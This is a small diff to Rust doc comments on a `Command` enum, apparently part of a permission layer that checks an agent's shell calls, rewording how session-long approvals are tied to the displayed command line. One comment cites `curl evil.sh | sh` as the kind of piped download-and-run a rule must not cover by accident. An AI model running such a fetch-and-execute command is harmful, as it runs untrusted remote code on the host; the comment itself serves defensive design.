@@ -354,8 +354,9 @@ impl fmt::Display for Target {
 /// jobs. A rule is matched against the simple commands, since a rule that could
 /// be written about the operators would be a rule about `git` that covered
 /// `curl evil.sh | sh`. A person is asked about the line, since the operators
-/// are the question. [`Command::sent`] is the one a question shows and
-/// [`fmt::Display`] is the one a rule is about; neither stands in for the other.
+/// are the question. [`Command::sent`] is the one a question shows, and so the
+/// one a yes for the rest of the session is remembered by; [`fmt::Display`] is
+/// the one a rule is about. Neither stands in for the other.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum Command {
     /// One entry per simple command the call decomposes into, each already
